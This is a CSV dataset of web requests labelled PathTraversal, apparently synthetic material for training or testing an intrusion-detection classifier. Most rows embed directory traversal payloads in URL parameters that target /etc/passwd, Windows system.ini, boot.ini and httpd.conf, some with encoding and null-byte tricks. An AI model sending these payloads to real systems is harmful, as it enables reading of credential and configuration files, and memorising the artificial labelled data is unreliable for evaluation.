id,class,vector
16311,PathTraversal,/lCY7or.736oaDqcF1/a_rSVr/sesixmii/nfnnfz1O/ejqpoqqRN/GpDgBDBWRnNwinntP56/geono/BneeasrFosoedhP2imer/oo/uQkXeS3OcO.asp?ctaa=0560&Tdrpi=bgsound5dkem9andes&ttDnljae=htoui0rmGytp&aerlPoh9wco1doa=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&NUr0U=aai%5Ds41O%5D2t1obhttpthaving
16315,PathTraversal,/onle/Igusr0kcI/43/vnvidhANzq@/nnW_IzIR/7m6Tv7QxgpYnZWX@u6x/nrvoJidmV_ZS2Xm/rTnhcnonLoAtaw/1copy.sh?lfoenfa=aeibodyaade%7Er&eu4ItrQdert=sgK&8gn6=840&0-Bt_a-execB=93&nmSc=scxQUt8.1wx&lt0coUsa=%2Bwo&Neeneao=596728449&olxhuebtit=Nttknn7wlnA&oiJigeior=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&E6YioZexecz=8576&zBna1jvB=edrHmeteoeesd&shu17yvsiCEe=7q7qe&oniEn=59308384&vthteNdT=pnmbnodepacofn
16320,PathTraversal,///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////?
16331,PathTraversal,/y@BCMq5kRCRouH/i0eerisidthndwz/taehtkt52t/f1fTVKeFu-cqyC/rX7dS9/ti7t1sltaeGm2sncattg/rbnTao7qnceobzl/fhlp.s41KH/PLftZQ0T/exDgtYmEdrVC3pa81/e2Bdansaois3ntinec/apsueae.jpeg?q9nsoaTu8qan4r=collection%28+file%3A%2F%2F%2Fc%3A%2F7metn%2FalhnIbie.xml%29&bhkekxsSar=0&OaA=6865437&zsiqnseapa4q0u=Au&pef=c8htelnetzirT%27mto%3B&ehoz2ahtegiOa=knajrunzmhlll
16407,PathTraversal,/2DdoschgYdTx/r.j7FS/qGHmod4/oq/NKf3SfGqMeJb/danlOofCy.gif?tldlsae0xo=f%2B%5Bseeinsertsanlikenfk&ronvn=99087751&ejswau=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd&Oigyb=8&TqMstdinlikepnwPlogzE=555933&eabefasHe9Traer=ieYtnh2Z+t&ne9axzRstbrci=sfnlatpc%3Bl&V-nweN9soF=yewleeknrxKss&imgBu3F422=65297038
16413,PathTraversal,/eamg6n5rua4faxsgwo/nficaheaie/Ll/f1BL-EB-7y53L/dtqTfx88He-QU@T1@-/Kq@/x1and/uselect7Z9VzcPMWz9betweenc/positionechoSNWFnghbBlwM/h9jOST9zO/r3eNonsa5rohnNt.html?ljE=esga%2Bry7A&usipecaeargce=s2Bqmq&emdtmondrtvh=file%3A%2F%2F%2Fp%3A%2Floi%2Fgebc%2Focncsgic.xml&altrnand=+&qGpfB6V=rqhs+1%26mql%29t&ocKJ5XmochaXNnc=tda9&OUSlt3Dt7=%5Caenxstyleok&4P74objectxO=nkfttsuqrEsR&urIdon=aonp84noHkuvmn
16414,PathTraversal,4satdhintseie=iszs6r&t6uqnoeat8f=pZMhZx&catCtne=eudui2rttCrdul&OzDXiHy9VL=yUe8T&u00execa-xL1xeM=ebfEakewciuaC8orsy&TFf-7=2496501&szpi0aomuea=60&e0drpw=c&oSrqmr=eDk_yn&towdeyreutrmd=80&aoipoiHsap=104012&aid=052717&o7n=mdl6ve3aac
16416,PathTraversal,5xVgX=\Nha&tctrddrm=..\..\..\..\..\..\..\..\..\WINDOWS\system.ini&shd=yOxxiX5y&eyAnJehtvbtk=65302215
16434,PathTraversal,/h8I27JOYr/4mochaWNAgXHi.tiff?heah0ra=Ao%7E1Prhcnmg&1tth7e=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion&vtinarye=tcMQzw2EY&tasihm=txp_ol&ws3rjnTnbhpEieh=gXiNjjC6_50p&tosfeurlc6oL=%3CtLFeyc4n%3Fal&7ec8rogeHieeetE=4003&6oo=oOz&ftrrieS0nIi=hPj%5CtIn&grwqlbdsl=iI0epbi
16447,PathTraversal,/sl6ihz2srnnmsOcoqa/en3ghlsaanenjtadTL6x/i1ZtYh2/tHontrtme6sns/mJU/c60DpsW9.css?6drepT8hb=uAec4ginsertt&mGY6scatsEJ-rmi=%2F%2C%2C%2C%2FaenaeOp%2FCtieF%2Fpasswd&sO=ca%2BlN%24skcodasfzuC&yn8O5Er=hfi+e+teyr2c1a7eoSt
16466,PathTraversal,/fm6hqwahf7ecesccteg/umsb5t/eO5wpi6v5EoD1/lNrrmiHseergfirmruo/11/peutiHdsa/umg_flNzA/yaRc@0q/7dnane/q0cX1Fbys5c.cgi?ltyaEvrteys=De6oq%27inrtdadaq+rkE&neuepexYkrcfgn=ehZ96d&pltoRl=csktvhoIgo&ricl=r%3Dfona&rhuphvy=2394182&eNy9selectTv=r9FrZpa59XIH&tlcawoeihja=..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&0s=50074
16478,PathTraversal,/oQUO52/ExuqdHbdyLgE/N0zbhp5memae2tl7l/DE8divKP0dkt/uneO.html?dSh9e=49712274&tehqe=81&ELhuwiuFifcccm=.%2F..%2F..%2F..%2F..%2F..%2F&iesMew4hesma=yve1flk&hiK5u2M@@Ao=98920&QgXpWAHosamfJ=13
16504,PathTraversal,/a0ELycbdyK6x2pEF/las/eGOPGYFNPWURZ9Dta2Yg/5bL-ec@v-T6H4Mrmfu/TstyleHs4OkX/imrhanoml/r-7@W/SB8.mhttpgnph-Q2Uk.dll?group
16508,PathTraversal,/error/\..\..\..\..\winnt\win.ini?
16548,PathTraversal,/.nsf/../notes.ini?
16621,PathTraversal,/5n/iBX.DxpcMdX5Y/2VEnhIh@UOC2qAsT5HFB/iiEp/pmf9e@/eYkyb42/naasnT4nocraoixwm/tVrOD-2.AgoIm1rF0K/u8buUxbPVXaOy9/5T6YuOIIsorXTJGTD9St/Dizt7si4riioHte1Aer.gif?
16672,PathTraversal,/.nsf/../winnt/system.ini?
16703,PathTraversal,/6egrrbq/aOaer5b1Eytho8dm/ystupegalh9bCrlt/szrwiaaYbttwrhnhsm/i_JsdH7CbuCYZeX-WF/tnbeyi3rwyclsitj/eoCNVw8zRp3DzDD7/zQ4/7wlt7seeoa8ayo/CWlhThAmi7ntweu/tidiu0Ntraasft.asp?njKe=%5CWINDOWS%5Csystem.ini&hSsoheeI=iO.Dm&upo=baaiN%2Boiiecua&4vSae4tdeotbecw=egN&uxem=8zE8G&ain6tbEe=353161
16747,PathTraversal,/o@5hNfbgCgl/_50-5fFYLsami@/c3positionncr2B/eFzf/leseAjarhfyRiciirnA/tntHej3eonmshn3am/3fZhILQKE5IE/oS6ItJdG1q7WJMHIF.4@/4vLB-tmpBPS/DeOUJ.htm?irH8Qa=se
16773,PathTraversal,/error/\..\..\..\..\winnt\win.ini?
16791,PathTraversal,/xn/dSSyjjN8.cfm?sl=2541531&l5ahRtdsWsDueh=elsiptt&He=df4ta8ushutdowni&nctUirtelnpa=ieinputN&yr_MbAi_0Yn=6995618&9Onehts3hthd5c=09389&oa=89&BShpxBtelnet0OWeJ=e%7EITwhere&FuLgx=nte&rbaqosdauYuTp=elsotmee&Jb=soXFYt0lwv
16794,PathTraversal,/f.Xn9.tiff?meo=L&iOtand=813518&jnga=rqK.e9FnVeI&XPz-jirz40=697705&ne3ccilsrnT=129&hei8Munaesm3i=r4sFcCZ&snlaqtW=m6Flb_ecnCW&s9tz=atwa8nhrtbHcn&0drngrn=..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&eodxrgIirsnnoe=9477
16804,PathTraversal,/t8uuv6e.mdb?KNne=88&oo1bSmee5kc=d%27riincludefwyarrmot&5eruE0ec=wPQIsJamSyS&spotravn=betweeniArwcd&6TEcaW=alQreaIF3nAF&FkseapOx8isOt9=Dn%2BRn7a%3B1&J-HservicesFGAnph-L=fapcul&sn9t=8f%29&uta=799903216&tiwsu4eyTst7au=..%2F..%2F..%2Fusr%2Fdsqqdsqsd.xml&tnhdsnezeeat=eo8+&@pHid.=scriptne&sRuAi=762254
16814,PathTraversal,/al6hottvilanuu/0Z6h2F7SqW8HpL/eqM.bkt6/Cstylezmeta/fgASWM.fR-Af@dC/gn-0dnZk8x/tehlehthi2Eifuedosuu.php4?Lnhaanpruip=%3Ff&hF2og=hformrri&lckzt54=..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat
16827,PathTraversal,/.nsf/../winnt/win.ini?
16855,PathTraversal,/scsbLtemzuei13su/l_N@IbvrAY/feSe4le/hsteisimr/oMB0aj9mG2yy.-C/L_NG2admincAmb82dgf/pl6IRskCTb.jpg?yysur9o=itobolhlrnfe
16859,PathTraversal,/duu1TzUAQallOyHR/Tmcira/zggsefo/pboot.iniZR04K-HRW/rhetyl0aevniidI.cfm?waahn=st2&amc=rtlv&n8=ncvX&e2lnlaeitM=%2F%3Ae%40ewhopoh1e%3Ahe%3D&zip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat
16886,PathTraversal,swnl=eJdJ0.&O7scsontydpty=%h\ot&6e7lng=tide&g5ecctn=n&obneti=gs&hmmagnUdn3nn=oLr8XYqdb&tfsbwupsoeun20=n:\autoexec.bat&aylhA7aesT=la&7ghaNr=25608445&nbjgqtvbpst=r
16910,PathTraversal,dq7=hpzhiepo&m1iutr5s1=e&eWjnY1efnebA=i-=bin&hoat5eeaasOc=40017373&rdes3doqcW=gtQcNsx3HEJE&lointn=527923949&1hsor=3kNopgbA0rb&eease7csq=i caoeselectisernpeNm1REh&E4rja=950074
16919,PathTraversal,/cDS/UW7aV8L_wh/sate2haw/TsvnCDK/dZdegoagotnbti/Iy-/r8d4hgu/smsAadancfpeeninjut/5e8-K.9Ui0/amghlWt0Z/roellit.exe?gIeiXkv=e+a&rar=rU6WqLgvEssu&4EtmnrtnSs=mmp1oaztme3ohofibw&dyetdtrk7urw=eCS
16922,PathTraversal,.////////////////////////?
16939,PathTraversal,/elsrHskaaeBonauh/hHeegopEhss2ni/2oSeedlpekmrmlgcosea/@XFCtlikeK/itFf-nPk3TqEhPX/anmWwtVpfO8Qq4Q3W-H/nFlDk5.prnUe1LjKL/mlHi/apngwwno.dll?
16969,PathTraversal,/w-Wk/oKxfLEdUs3EOM43n5B.js?S41i0T=81502&connectNF1dV6f0=%3A%5Dbpo%25wv7&C_oEx=lEtiednservicesr+et%7E&vOtijsam=ewaohifrl1oq&zNWI@vxpZ@=07&tCvTVallPbetween=7v&ct8aEavshe11e=iH6R&iyhe=1&augllQ84mfT=xoFhda93d4rc
16978,PathTraversal,usmsm26enobO=552910&sItlg= ni4lg &Degs5h=aie6setif3hceek&lOyNw=69060513&wcxevfs=66454575&X1m-L=m1n86aN0vjtae|a&izdoez5s9fo=28332&ixgTeXodolstsn=6&A3Casaitwerst=g0aS_&et1adymerid=hkalwbjilqlr
16992,PathTraversal,343kmt=34679&nenelurjeirotK=oeccat)uet~havingr77\tn&wHpasswdhM=01861605&0io4fN=..........................WINNTsystem.ini&hr=e<a Epso]wesgroup bytesytrz
17005,PathTraversal,/lnsiialuDtcgcAZY/6Tw/UtwCH_fU.asp?gVkl6zDf06.V=tailibelb%29tr&cnntinu=s0aweCter%29ye&clmrUtose=s%5Cdh&op8i=5094&9icii=mIphhieeae2fok&mHH3PUv@D=cdd%28rlla&htjaehEa=..%5C..%5C..%5C..%5CWINNT%5Csystem.ini
17021,PathTraversal,gsjfvw=p&tehskbero61a=ou0a&heus0lo=o6heay1ldEpositiona% &soht=2eqcSctyzhejroac&esiankfoynrx=f5i&we3as=tQ9-iwVyvKq&ffbjSRxatgfet=t|al2&eursoR7wqstcct=xu.py8af&tooWb=1
17074,PathTraversal,/asweg3yi/u78ha/ymknr/38nsaseio/mAwg.zmY9_dKDW.aspx?ayJo3alsuoeo=et%27niasr%25accepti+rucMm&eaAl6henLLh=%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fanstveat%2Fmaneliitnt%2Fle%2Forvenias.msf&ugvbscriptChpassthruLrX=e%3BfT&e5onSmu=rB0Z8SNk.p&arrh8=4212017&rehvLxmgni=0&omnjd16taemewia=elqaTserrixZudt&srlicntosba3=99139552&ytSblrpe=st9i6&opnrsnhg=e%3Fvbscriptb&aItyo89eo=aO2XfJHE1IOh&pOmcc=ecSxr&mwgetIs=+hh%3Ce0t+awobts&leSteH=ismter&EiQ0nmptvlheeea=lM76mLV
17103,PathTraversal,Tucolyjgec1t=wvu&Oncumega16af6Da=0&kcvgns0nus=aoahcaFDtitjr&w7fscisterb=owwetykaT5s&tpapto87pm1my=60604129&hetnsor8crw=../../../../../../WINNT/autoexec.bat&s1ees7b=crsOgwd3osooyewfp&dogyrt=0020&je=7&t6eP=521304&TU@TnetcatFqZ=ht
17125,PathTraversal,/yd3rIpacrr/ucucx/aeeeebtt5qikeiero.gif?ee=hrtetsDip+e&qdco=agR1nr&7rfnmntimmoaa=usnNh&@W.8D=sEgAL&rtq9t=37346&gus=v%40I0_m&mxgkuuhzE=017687&seteeeeactr=.%2F..%2F..%2F..%2F..%2F..%2F&8nbtdyo2koiSiev=07069746&X.IntmpS=86&pKevalt_S0=3&aronraR=14521287
17196,PathTraversal,/yFisisdt2en2tntV5/g_xzGHRi9uHng_.ZJTLF/Ssulz4ANTJ-htaccesTlL/httpsTUM-xuK/ho1oqtbnraItitaenctt/z@-3qdLSCPucP/yohatcalehy/sOGHeehnni/omEotLcsebvelPc/kpyatMii.pl?ci1r0z2eh3=%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Filndriti%2Freneetil%2Ftrisar%2Ftato.sh&zmorewah9e7oa=fevalandttti&mkca5t=%25%2Fejtie%3F&oarudi8hyut4P=9370
17297,PathTraversal,aau1eaeglfe1tr=thu&efsto0a1cneevbu=mhwJ8.f-4v5X&FAye=21&mblJse7oi1q=t)cL0pocbfrom4cnni<o&prosnp=xOqej3Ot7SM&t1TorN=ooo2iehtgETfoo&tl6hODtdwaee=\WINDOWS\system.ini
17302,PathTraversal,/eQzjLNj-Mr09tYGe55V/weih/a@4a_XTH7Vpoe/eEfkw/ldytegi/nc/slhleomTkeehacrn/enzG3dkvDtnL.msf?agnNdt1entcaH5=51635497&.GeLxbXXhttpsLv6=8235461&tolotr6iiwem=doc%28++file%3A%2F%2F%2Fc%3A%2Frmmr%2Fan8n.xml+++%29&hsRt=0aaEEyvbscriptWd%7E%5D0xmlbhttpoph%2B&tftv=en7A
17384,PathTraversal,/7wp-K.css?oib=17294&edrllbgeatmowe=%3Eterc&a8ni3Retdes=asOz&Ni=0124&tmlre=225571&Shqc=t8d&DlogC8=sd&BD_jGPprocessing-instructionq9Er=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fyo.bat&Ab3cw=t0ma7epdna&alavOei=aSe
17395,PathTraversal,oong=/etc/passwd&Erri=sKNgp-&qoe5capaca75wr=ocjNO&hlhane8qe=soa2x&rE=h (Ii4zye\ &est9libHhs=074655&QVYWreplacezMTx5il=2227716123&oistsErarsmnteo=td
17409,PathTraversal,/dOiKb.msf?idiiqRmfXib=%2F%2C%2C%2C%2FyorE%2Fcnso%2Fpasswd
17413,PathTraversal,/eGwpasswdwzxB/vdw/ittTeaecnzeau/7xerTtenAoae1rAsar.shtml?fWr1=urAR%28d%3A+lCi1usrm&c1tIhn8ahhssnd=rioqEtesi&nLTuirsne5=uuJ%7Ed&aenayTdrrg=hi%3D%2B&nsOo2Aiufa69i=648408196&8eW_7kaLoXallC=..%2F..%2F..%2Fge%2Fadmin.txt&30aH=log0bE4bodyhz2co+H%29c&snAe=1550&selcptTto4r=afiegroup+bytmpmetaEstylewindow.open3gs
17434,PathTraversal,/ys2bhzrsT/a1ZlogM/aAeiurgxlenwhar/ioalauYeijextgeaulf/sLHgcwpassthruw6/aCA1dN4RWWML/4Ih@w3NU.hlv1cc/hF2QEBa9/hTwlm9Dha78Tje.tiff?Irhyepsar=2109&mtRbeaBdsra=669166314&tjstleecptt=288&Eas1see5c=8287&apNatd=doc%28++++file%3A%2F%2F%2Fc%3A%2FfgnI%2Fsnt.xml+++++%29&oprocessing-instructionT.ZPm=oia&foe5thlpEwa=hk6IvQ-bSOh&uatthno=477645&Drfservicesservices.z9=r62&rjQ_To@VZ4oand=eehemdetf%2Bsam&5agdTuih=4301949677
17440,PathTraversal,/Ly/ooneIi/hzsihJwLd.P/zduyP9ehnaeolenaoErm/pbwaavTT/zyV703ajIx8xp_/rccRstLlnrptThyeh.shtml?ertho6oyr=-fhi%27rst+hi&3fi=hrAmr0ee&okwreaXznwubazW=qv_&eeNsp=684308&b0mR=%3C%3Adh&iT0da58Lel=etnNvzsefHit5n&e1ibE=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&ehoos=36890907&gsdhapiipt=n19Oz&o3ir4tlea=xDrz5.ymMhYf&4RexecUn9=yrsa7dpsea2s&eSsUae7edt7s2=f0uhfuh&oieo8huiciv2=28676&qVdeleteQWsIe4=6267&oleqwlqINgonw01=e1nEnts3rDsslL
17460,PathTraversal,/9lmr.dll?Oe6eTTimylbosa=e5iev-tdZM&oall=hsReu&gmochaLVmlV@vPRQ=acxml&1Uon5imm=563&rneghe1ssrtid=lstdinvar&ghetekhdolHSst=03927&etgmmilrtr=dnoo&yqisSj=nzTo&dlii=ie+%3CeBe4ssat&ci3unE=..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&wtelnetS7J.JEKkt=si%3B-an+oo
17508,PathTraversal,/oHp/JT7naru/unhkaasqDlBt17i/7r/having8.Xhtacces_O.php4?ty1fDeos8easgt=7t1povaumnbtfo&etue=c%3A%5Cwinnt%5Cboot.ini&diap=2839
17509,PathTraversal,/esXxzCmccvCRRGS1/coqhr/raodyeolsrnEmyestcoh/aJPYxG/bznJ7Ib/jcBI7KU6k/rebnaenFtebetsul/th33slF3/ioKgwYH3Wg_HUSdAn/qTuMmpobjecta.bin?iwras8te=5525&hk0swne=dgg%40rtwe&pQraCenar=344163&frcpced=esostylel&ixpiny=lupu4zxn&hn=lnall&rfeea=eRzRb&EnullBxxRqwU8UA=t4rhr&yet45tetsefn=h+f&IsieeseimP=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&mn9Rl=46&edE=9
17524,PathTraversal,/aba/ZhttpsSzKyJZXdW/ahcerdnt1euaGBles5ll/oqv2ymLaa/fdrtjaAqiqB34e/@3bpY/eRqRAHHHB3Gcr@/yt20iwaetw/p-MQWeHH.wMI/tD.php4?i5=an4eUie%7Cm%2Foa1zpstyle&ohtaccesxek=gnnsms+hrr%246ti+urcp0&hsS2srmeEd=..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&csoda=re
17525,PathTraversal,npm=bnjXBxH2xen.&oybaee5AwnaveU=..\..\..\..\..\..\WINNT\system.ini&knireH=2-oc&1errnS2isEOrina= o&oznVpKg0Z_t=32
17551,PathTraversal,/@VbuniongrwR75E/sgoi1hopWoycoiuir7a/eOcm.vp_dbfH/Msar9aAiksu/bLunirvxhtdhtrot/C1tnogRtarfa.aspx?shun0zutPdDooiE=.%2F..%2F.%2F..%2F&ANv=aiDEdteh%3ErselectxtermH3w%3Fnia%26
17554,PathTraversal,oet=AeoyZg6jafub&tozUr=/../../../../../../../Inetpub/iissamples/taan/atsinsli/al/si.asp
17558,PathTraversal,s7NttomlA50=iOrONs0uV&5C6oxRMNboot.ini=n L4yit)ewlElikewp-Lc&sQzt0=eyuustzipb&emttdn=hdVbyq6&bshzeoFzmtyl=436432&fm=966&oedtherdL8=we6h3id&vnskLand0L=x1oN8&IGea2=8393&atomiuFr=axers&HI0A7L=276&8np7=7258992&tybvemKs=../../../esni/admin.txt
17589,PathTraversal,/t138uVXNiGVmp7Spe/ebogtr1etfkr/eef/qieohaeitaauratny/qpDtkHE_HNXEaFtN-ypL/k91INdiP-Bl/eP3Ky39.cfm?Jbvxix2luJ=.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F&4chaoiegpo3n=nph-3cbadxorinhtaccesa&opttp4yllndohdo=h
17590,PathTraversal,/esj7U/k2AsG/bR.nsf?Pw.n6w=i%3A%5Cautoexec.bat&o6rsmw6lep=98105180&hoU6tanoaoa=lG7&eroNop=209&hW2wstlUpnsa3ea=g8UlivARqL9&ueN3IxdvcihrotR=rre&eeaenhd0jeflu2=l8lip8snndrol&uvycof=739&io=oJVy&EeoLuilwad2oozi=81&eam=49Bhb1kQn&DGRXCdivxusrol=s+%3CaEearRal%27&7mBe4he=io%2FtiframeehteLtXs1sEuxf&eL=78434184&7is=4533723
17595,PathTraversal,/twaP26r0t/tTgPpnYY/cg@ipsYrmMQbU/c0mpCttiworarHTmMw/nqnn0EAie0esmebtR/aa_hgKttHM8Bfs/dentadOtidnaarLDSsN/4ErdtQVZgcQC/myie.js?8to=ti4e&eflzohois=78&Q_BNrFO=p&Hynwaicax=e+s&0man=1dwereZ&R_-e_KWQobjectBWO=97592&se=tl-divevIeeevle8r&rhRqeayn1aiso=a5yb&ihytidot0ne=cs+ety%24w&ctebs=ti&Wh7r222cap=39651088&ttruev0Eeedy=..........................WINNTsystem.ini
17596,PathTraversal,/pI8um.jpg?ehjkecpsyHte=3&5jrmrtibefhb=aunion3&et4mLE4c6ja=2386586&2ioanc=32tntmn&PBrsh5pdd1=800260&Eztfirfa6e2yaai=408&e6nsT=%2Fetc%2Fpasswd&uiimttbnmym=aareEemhdeh&oO0ry8u2=449&NnP98erbishtehd=rnmhiN
17640,PathTraversal,/gkD.GASEeJvXXD.ACLu/aogscsneS/eaetxkruffe/H0e0atej0ooamHb/tdrhtadsnutrhrnth/lmee903uscou8tt/7sTSAHhnl.php3?itoymfhklepea=%2Fetc%2Fhttpd%2Fhttpd.conf
17651,PathTraversal,/zasaiejgW0dNhl4/WxiqAjd7K1bYQ/2kb4c/yaH.shtml?slshrtzo=ooitxp_uU&oZKr5open=37037141&teai=teaI&eetnI3de=82319432&H.j9group
17654,PathTraversal,/ersvghp5BamAtmreeia/ereonyoedGyt/o5Hi/g-ftp28P_orrR/1RUK8XRgwPfo-g78@/nXCqf6IcQs/Teyarwshieebialt/mvw0lhspnlsra/aRyogreM9s.bin?Wd5KY9nAg=sesAe0seo%24netcat&iwoopedE8bemtPi=sQAFVOTUTs&Mhttpswgetu7perl=8&zn72g=t1a&nsNisfainio9=%2F%2C%2C%2C%2Fnxaaua%2Flbhete%2Fpasswd&enylgotoAadooim=m3dlBrim-t&2erm=t6Sv&bmfVd9=t6S&aeoy6ilwAw=euYaPPOdqw%40Y&rile9ovjamf=o9iUQ&knAE4v6tqhoite6=mochamsexec&nentrn7snfxi=%26wLvg&ed.WBFOUR=rttrdvcNb4enu53thm&nnp=0143
17665,PathTraversal,/KgselectW5Ak/loe0ouaayM/aLG/e0YZz3Ibeehn/mihtptrslspUo/gsh0ail.gif?vttahsou4iol7h=dlF&59eet=itSkhSt&Xpqkm=n&jXox=507193&b7ohmn7ueEu=nti&csTihcjfl=iphpyn&nEsd=g+&tgsbt516Ea=%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Felalanti%2Fesarseri%2Flach%2Folgechnall.mspx&getlmi=a%3BElocationto&acceptpasswdN0UfYc=imjbtosni
17684,PathTraversal,/tyl0NtnqMEoAKg-l-DR.tiff?7brfirbLre=wdzimugtotiEhuosZp&dhuReeaP=beafEkw+din2%27&CaDE=..%5C..%5C..%5C..%5CWINNT%5Csystem.ini
17711,PathTraversal,/e7admin@NxK.aspx?ued9geIiarf=e5KeLty&xl1t=115&gSUchild0=b2rofo4&tdrtCdnan7r4d2a=446904018&JNCg=xtt&FUi8optyincludeobjectLtjR=..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&Syo3RZFdFokE=nH&-L9YJy=%5B&rmI8ee=rnhtI&goaotordtuL=by2fweyddts&RaLnpamw=0IiXS-Yc7
17759,PathTraversal,/nGvvUvWR8-Q3/ouR46xQJaCs-/oNH2Yh7jj6aB1Hjc1/5nkM/rdsnpdiozkadEhage/bebftpZ4includeifL994L/fe3ie/tvdgiegi1meheRl/5jbeiaa.php?uUees=bojNeMlTaupn&d97aec=awunionny%29tbhfivA&afletold=61698&tdCaeLNlsttas=ol
17765,PathTraversal,/eaE/iuemlfAseqs/teAtAUEYE5VV/27m/baiuaah.jsp?iawsdrq=i%3B&srolhtl=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&Qtluhbkeaaf8=3xp_u%2B5+dwget%3Fk&HViHCTr=rmeuhbeLllink+&mp=30955447&ritaR=240690818
17784,PathTraversal,/qGL@8_jaU_W/l7auOitteromtseo1tB4/RySallX/d5pd/sEWn3a-0kPanaW5Mn/i2rtnys/l6kRlN9i8R0A1ccORWpK/bndsaoed/fnR2eTi/4iF1jhk/iiUstwalitjirt3bi7o.mspx?rr6w5bA=53&heao=rht&banK1yeeep=cl&enteltt=2421&m5do=qej%3A2xp_im%7Eeiatw&1gesoa7eLfpnd=WB&Twe2=Enez+5zdei&uvymoAexwnceP6a=%7EKh&1OMne1adduTsPA=9%3B&pcs6z3m9ton2=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
17802,PathTraversal,/oAB-nOg/mEeobH7erP814rro3l/Tcfgobgo6t/eegchtet8gp.jpeg?wcit9eek=aipectmtctn&tIrh4s=v%3A%5Cwinnt%5Cboot.ini
17809,PathTraversal,/snsMDXDJc7bQC8T-_Q/ku7Q-4P/7aaDaeEt/iRYyOA.E3-zsOrB/@AnodeZyn1jVAqtmp/kB/wf@3KPW6LI3wgPENcmii.png?ushpif=lStga&eqhtn=9e%7Edsezbgsound&isaip9l=48715&vESg.bLz=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fyo.bat
17816,PathTraversal,/edlroewhaliroogaT/h5YBFC/tBLKFIn4i5LYIXn7U-/aT3vCEfm8aKbmdSIpb/VUjY/aaascryT2srvtstt/ozRxf7jk.sh?5sC92l3=71133&bxBaOM=u&Pl4Srpl=rei&d18srd4=ana3&aovh=028340&as1Eettuo=aclUBWMEf&2gDwgete0xRG=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd&hart1tntsn4t=5r%3EtE%28+t%7Cetc%26sguf%2Fc%3F&iacTti=Aabeye9lhso
17830,PathTraversal,/rU3fxLH5XKDzCsG5lK.3/jtw/tgyrxYZv@krIgxjQY/ay.js?asee2=doc%28++++file%3A%2F%2F%2Fc%3A%2Fti%2Fe4ciet.xml%29&xL@N4Ox@Psp=5g%3A%40nrrncsreplaceRuuaevf&e0nbpsinrrwdaro=%25u&q7I9gupH=7336452&Jopr=8275624&tisnS=1&tnbotcOedeRtTa=Oeaern5a4oe&sareapaham8al=97406&thtlo8b=1&5qeeaOq=ou+zzpdpse&mtuounmnthl=etotyee2cee
17842,PathTraversal,/ZV_f9Ht8bP/yLkbrjhD3c/to1srxv2Mxn3qt/lorpeleo0h/aHOrd/arc/orsodfizrud.gif?jenaxtrhlbheg=%2Fetc%2Fhttpd%2Fhttpd.conf&Koptgroup
